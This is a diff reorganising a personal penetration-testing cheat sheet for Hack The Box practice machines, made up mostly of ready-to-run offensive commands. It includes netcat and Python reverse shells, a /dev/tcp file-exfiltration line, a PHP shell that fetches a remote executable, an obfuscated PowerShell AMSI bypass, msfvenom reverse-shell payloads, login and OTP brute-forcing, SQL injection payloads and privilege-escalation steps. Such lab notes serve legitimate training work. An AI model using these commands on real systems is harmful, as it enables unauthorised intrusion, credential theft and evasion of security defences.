@@ -1,17 +1,26 @@
 # HTB Cheat Sheet
 Commands I usually use when doing HTB machines
 
+## Table of Contents
+- [Scan](#scan)
+- [Enumeration](#enumeration)
+- [Bruteforce](#bruteforce)
+- [Linux Privilege Escalation](#linux-privilege-escalation)
+- [Tools and Utilities](#tools-and-utilities)
+- [Reverse Shells](#reverse-shells)
+- [Miscellaneous](#miscellaneous)
+
 ---
 
-# Scan
+## Scan
 
-## NMAP
+### NMAP
 ```bash
 sudo nmap -p- -sV -sC -oA nmap.out $IP --min-rate=5000
 ```
 
 ```bash
-nmap -sV -sC -O $IP -oN basic_scan.nmap
+nmap -sV -sC $IP -oN basic_scan.nmap
 ```
 
 #### Scan a specific port
@@ -23,18 +32,18 @@ nmap -sC -sV -p22,80 -Pn -oN nmap $IP
 sudo nmap -p22,80 -sV -sC -A -oN scan/open-tcp-ports.txt -sT $ip
 ```
 
-## Rustscan
+### Rustscan
 ```bash
 sudo rustscan -u 6500 -b 3000 -a $IP -sC -sV -oN scan.txt
 ```
 
 ---
 
-# Directory & subdomain Enumeration
+## Enumeration
 
-## Fuzzing Directories
+### Directory Fuzzing
 
-### Gobuster
+#### Gobuster
 ```bash
 gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u $IP
 ```
@@ -51,17 +60,17 @@ gobuster dir -e -t50 -q -x php,txt,html -w /usr/share/wordlists/dirbuster/direct
 gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u $url -o gobuster.out
 ```
 
-### FFUF
+#### FFUF
 ```bash
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u <URL>/FUZZ
 ```
 
-### Feroxbuster
+#### Feroxbuster
 ```bash
 feroxbuster -u <URL> --force-recusrion -C 404 -m GET,POST 
 ```
 
-## Fuzzing subdomains
+#### Fuzzing subdomains
 ```bash
 ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.DOMAIN" -u <URL>
 ```
@@ -82,66 +91,9 @@ ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.DOMAIN" -u
 
 ---
 
-# FUZZ
+## Bruteforce
 
-## FUZZ endpoints
-
-### gobuster
-
-```bash
-gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u $IP
-```
-
-```bash
-gobuster dir -u <URL> -w /usr/share/wordlists/dirb/common.txt -o directories.txt
-```
-
-```bash
-gobuster dir -e -t50 -q -x php,txt,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $IP
-```
-
-```bash
-gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u $url -o gobuster.out
-```
-
-### ffuf
-
-```bash
-ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u <http://10.10.10.168/FUZZ>
-```
-
-- filter by size
-
-```bash
-ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u <http://10.10.15.27> -fs {size}
-```
-
-```bash
-ffuf -u <http://prd.m.rendering-api.interface.htb/api/FUZZ> -X POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -mc all -fs 50
-```
-
-### wfuzz
-```bash
-wfuzz -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt --hc 404 http://10.10.97.18/island/2100/FUZZ.ticket
-```
-
-## FUZZ subdomains
-
-- using ffuf
-```bash
-ffuf -c -ac -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.forge.htb" -u <http://forge.htb>
-```
-
-- using wfuzz
-```bash
-wfuzz -H "Host: FUZZ.mentorquotes.htb" --hc 302,400 -t 50 -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" -c -z file,"/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt" <http://mentorquotes.htb/>
-```
-
----
-
-# Bruteforce
-
-## Login Bruteforce
+### Login Bruteforce
 #### Hydra bruteforce login
 
 ```bash
@@ -192,30 +144,19 @@ ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -X POST -d "user
 hydra -s 5900 -P /usr/share/wordlists/rockyou.txt vnc://<ip>
 ```
 
-## Bruteforce Procs
+### Bruteforce Procs
 ```bash
 for i in $(seq 900 1000); do curl $IP:<port>/?page=../../../../proc/$i/cmdline -o -; echo "PID => $i"; done
 ```
 
-## Bruteforce OTP code
+### Bruteforce OTP code
 ```bash
 ffuf -c -u '<http://<ip>:<port>/otp-auth>' -H 'Content-Type: application/json' -X POST -d '{"otp":"FUZZ"}' -fr '{"success": "false"}' -w digits -od otp_out where digits was a file with all 4-digit pins and otp_out was an empty dir
 ```
 
 ---
 
-# Meterpreter
-
-start a meterpreter shell
-
-```bash
-msf6 > use exploit/multi/handler
-msf6 > set payload windows/x64/meterpreter/reverse_tcp
-```
-
----
-
-# PrivEsc Linux
+## Linux Privilege Escalation
 ### Crons
 
 ```bash
@@ -272,7 +213,8 @@ export PATH=.:$PATH
 
 ---
 
-# Random things
+## Tools and Utilities
+### Random Commands
 #### mtu speed
 
 ```bash
@@ -287,28 +229,26 @@ cat $file > /dev/tcp/<attacker ip>/<port>
 
 ---
 
-# Find Command
-#### Listing files owned by a group
+### Find Command
+##### Listing files owned by a group
 
 ```bash
 find / -type f -group users 2>/dev/null
 ```
 
-#### Search for SUID files
+##### Search for SUID files
 
 ```bash
 find / -user root -perm -4000 -print 2>/dev/null
 ```
 
-#### using Find to find SUID binaries for root
+##### using Find to find SUID binaries for root
 
 ```bash
 find / -perm +6000 2>/dev/null | grep '/bin'
 ```
 
----
-
-# JohnTheRipper
+### JohnTheRipper
 Rules file
 
 ```markdown
@@ -322,9 +262,7 @@ example rule
 Az"[0-9][0-9]"
 ```
 
----
-
-# ASC / GPG Keys
+### ASC / GPG Keys
 ```bash
 gpg --import private.key
 ```
@@ -335,28 +273,28 @@ gpg --decrypt fragment.asc
 
 ---
 
-# Reverse shells
+## Reverse Shells
 
-#### mkfifo payload
+### mkfifo payload
 ```bash
 rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f
 ```
 
-#### python payload
+### python payload
 ```bash
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-#### Pentester-monkey
+### Pentester-monkey
 [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)
 
-#### High On coffee
+### High On coffee
 [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 
-#### Payloadallthings
+### Payloadallthings
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 
-#### XCT shell
+### XCT shell
 ```php
 <?php
     $data = file_get_contents('<http://10.10.14.20:8000/xc.exe>');
@@ -373,15 +311,15 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20an
 
 ---
 
-#### Obfuscated PowerShell reverse shell
+### Obfuscated PowerShell reverse shell
 ```powershell
 S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 ```
 
 ---
 
-# Services
-## SMB
+## Services
+### SMB
 #### List shares
 
 ```bash
@@ -419,7 +357,7 @@ run on target machine
 copy <filename> \\\\<IP>\\share\\
 ```
 
-## FTP
+### FTP
 #### connect to ftp via url
 
 ```bash
@@ -434,7 +372,7 @@ example:
 lcd ftp
 ```
 
-## SSH
+### SSH
 #### Get a file from SSH server
 
 ```bash
@@ -476,12 +414,12 @@ ssh-keygen -f mykey
 ssh <USER>@<IP> -L <LOCAL PORT>:127.0.0.1:<LOCAL PORT>
 ```
 
-## RDP
+### RDP
 ```bash
 xfreerdp /u:$user /d:WORKGROUP /p:$pass /v:$ip
 ```
 
-## WordPress
+### WordPress
 ```bash
 wpscan --api-token '$your_token_here' --url $URL -U $user -P $password [ or password list ] 
 ```
@@ -490,13 +428,13 @@ wpscan --api-token '$your_token_here' --url $URL -U $user -P $password [ or pass
 wpscan --url $URL -e ap,u
 ```
 
-## MySQL
+### MySQL
 Non-Interactive command
 ```bash
 mysql -u $user -p '$pass' -D $database -e '$command;'
 ```
 
-## SNMP
+### SNMP
 ```bash
 snmpwalk -v 2c -c public $IP
 ```
@@ -510,7 +448,7 @@ snmpget -v 1 -c public <IP> .1.3.6.1.4.1.11.2.3.9.1.1.13.0
 
 Ref : [http://www.irongeek.com/i.php?page=security/networkprinterhacking](http://www.irongeek.com/i.php?page=security/networkprinterhacking)
 
-## Docker
+### Docker
 ```bash
 docker pull [image name]
 ```
@@ -551,9 +489,7 @@ docker save [image] -o layers.tar
 <https://github.com/micahyoung/docker-layer-extract>
 ```
 
----
-
-## Git
+### Git
 To see previous commits
 
 ```bash
@@ -566,12 +502,12 @@ Get most recent commits -1
 git diff HEAD~1
 ```
 
-## NFS
+### NFS
 ```bash
 sudo mount -t nfs <IP>: ./tmp
 ```
 
-## Redis
+### Redis
 ```bash
 redis-cli -h <IP> -a '$secret'
 ```
@@ -581,12 +517,12 @@ redis-cli -h <IP> -a '$secret'
 KEYS *
 ```
 
-### get specific key
+#### get specific key
 ```bash
 LRANGE authlist 1 100
 ```
 
-## MongoDB
+### MongoDB
 #### start mongo
 
 ```markdown
@@ -611,14 +547,14 @@ show tables
 db.$table_name.find()
 ```
 
-## VNC
+### VNC
 Bruteforce login using hydra and msfconsole
 - hydra
 ```bash
 hydra -s 5900 -P /usr/share/wordlists/rockyou.txt vnc://<IP>
 ```
 
-- Metasploit
+- Using Metasploit
 ```bash
 msf6 > use auxiliary/scanner/vnc/vnc_login 
 msf6 auxiliary(scanner/vnc/vnc_login) > set rhosts <rhost>
@@ -632,7 +568,7 @@ Interact with VNC
 vncviewer <IP>
 ```
 
-## rsync
+### rsync
 #### list files
 
 ```bash
@@ -653,15 +589,15 @@ rsync <filename> rsync://sys-internal@<IP>/files/sys-internal/.ssh
 
 ---
 
-# Tools
+## Tools
 
-#### Enumeration tools
+### Enumeration tools
 - lse.sh : https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh
 - linpeas.sh : https://github.com/carlospolop/PEASS-ng/releases/tag/20230808-5e84dec0
 - winpeas.exe : https://github.com/carlospolop/PEASS-ng/releases/tag/20230808-5e84dec0
 
-#### exploitation tools
-- msfvenom
+### Exploitation Tools
+#### msfvenom
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx -o exploit.aspx
 ```
@@ -670,7 +606,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx -o exp
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00\x25\x26" -f python -v shellcode
 ```
 
-- searchsploit
+#### searchsploit
 ```bash
 searchsploit -m php/webapps/49876.py [module name]
 ```
@@ -680,7 +616,8 @@ searchsploit -m php/webapps/49876.py [module name]
 
 ---
 
-# TTY Shell Upgrade
+## Miscellaneous
+### TTY Shell Upgrade
 #### Spawn a tty shell
 
 ```bash
@@ -713,9 +650,9 @@ stty rows <rows> columns <cols>
 
 ---
 
-# Tunneling
+## Tunneling
 
-## Chisel
+### Chisel
 [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
 
 [https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)
@@ -744,7 +681,7 @@ Now I’ll connect with chisel from the container:
 ./chisel_1.7.7_linux_amd64 client $my_ip:<port> R:<port to forward>:<target ip>:<port to forward>
 ```
 
-#### example
+### Example
 
 forwarding port `5985` from the docker container
 
@@ -758,27 +695,27 @@ forwarding port `5985` from the docker container
 ./chisel client <tun0 ip>:<port> R:<port to forward>:<target ip>:<port to forward>
 ```
 
-#### forward 2 ports at the same time
+### forward 2 ports at the same time
 
 ```bash
 .\chisel.exe client <ip>:<local port to listen on> R:<first port to forward>:localhost:<first port to forward> R:<second port to forward>:localhost:<second port to forward>
 ```
 
-## Socat
+### Socat
 ```bash
 ./socat tcp-listen:8001,reuseaddr,fork tcp:localhost:8000
 ```
 
-## Proxy
+### Proxy
 ```bash
 export http_proxy=127.0.0.1:8080
 ```
 
 ---
 
-# Web Exploitation
-## SQLi
-- Union Payloads
+## Web Exploitation
+### SQLi
+#### Union Payloads
 ```sql
 ' UNION SELECT 1,table_name from information_schema.tables where table_schema='webapp'-- -
 ```
@@ -801,13 +738,13 @@ export http_proxy=127.0.0.1:8080
 
 ---
 
-# Windows
+## Windows
 The script below looks for Win32 services on the host with unquoted service paths, not in the Windows folder.
 ```powershell
 Get-WmiObject -Class Win32_Service | Where-Object { $*.PathName -inotmatch “`”” -and $*.PathName -inotmatch “:\\\\Windows\\\\” }| Select Name,Pathname
 ```
 
-## PrivEsc
+### PrivEsc
 - check for user privileges
 ```powershell
 whoami /priv
@@ -840,7 +777,7 @@ crackmapexec winrm <ip> -u <username> -p <password>
 evil-winrm -i <ip> -u <username> -p <password>
 ```
 
-## BloodHound
+### BloodHound
 
 #### neo4j
 - first start neo4j
@@ -858,6 +795,7 @@ bloodhound
 ```bash
 bloodhound-python -c all -u <username> -p <password> -d <domain> -dc <dc> -ns <ip> --disable-pooling -w1 --dns-timeout 30
 ```
+---
 
 ## Compiled Binaries
 
@@ -879,25 +817,25 @@ python3 sharpevader.py -p windows/x64/meterpreter/reverse_tcp -lh tun0 -lp 9001
 
 ---
 
-# Wordlists
+## Wordlists
 
-## seclists
+### Seclists
 - seclists : https://github.com/danielmiessler/SecLists
 - rockyou.txt
 
-#### Make a wordlists out of a website
+### Make a wordlists out of a website
 
 ```bash
 cewl -w wordlists.cewl $website -d 3
 ```
 
-#### Make lower/upper case wordlist
+### Make lower/upper case wordlist
 
 ```bash
 cat wordlist.cewl | tr '[:upper:]' '[:lower:]' >> wordlists.cewl
 ```
 
-#### Sort a wordlist
+### Sort a wordlist
 
 ```bash
 cat wordlists.cewl | sort -u > sorted.lst
